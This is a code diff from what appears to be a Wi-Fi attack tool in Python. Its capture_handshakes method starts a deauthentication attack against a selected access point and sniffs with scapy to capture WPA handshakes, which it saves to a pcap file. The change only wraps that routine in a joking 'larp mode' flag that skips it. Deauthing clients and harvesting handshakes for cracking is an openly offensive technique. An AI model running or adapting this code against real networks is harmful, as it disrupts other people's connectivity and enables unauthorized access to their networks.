@@ -45,13 +45,15 @@ class capture:
                 
         return False
     def capture_handshakes(self):
-        d = deauth.DeauthAttack()
-        thread = threading.Thread(target=d.start_deauth, daemon=True)
-        thread.start()
-        bpf_filter = f"wlan addr2 {globals.selected_bssid.lower()} or wlan addr3 {globals.selected_bssid.lower()}"        
-        scapy.sniff(filter = bpf_filter, iface = globals.interface, stop_filter= lambda p: self.check_packet(p) or self._stop.is_set())
-        if self.found_handshake:
-            scapy.wrpcapng(f"{globals.selected_ssid}.pcap", self.found_packets)
-        self.found_handshake = True
-        d.stop()
+        # while larping you don't need no actuall sniffing right?
+        if not globals.larp_mode:
+            d = deauth.DeauthAttack()
+            thread = threading.Thread(target=d.start_deauth, daemon=True)
+            thread.start()
+            bpf_filter = f"wlan addr2 {globals.selected_bssid.lower()} or wlan addr3 {globals.selected_bssid.lower()}"        
+            scapy.sniff(filter = bpf_filter, iface = globals.interface, stop_filter= lambda p: self.check_packet(p) or self._stop.is_set())
+            if self.found_handshake:
+                scapy.wrpcapng(f"{globals.selected_ssid}.pcap", self.found_packets)
+            self.found_handshake = True
+            d.stop()
 
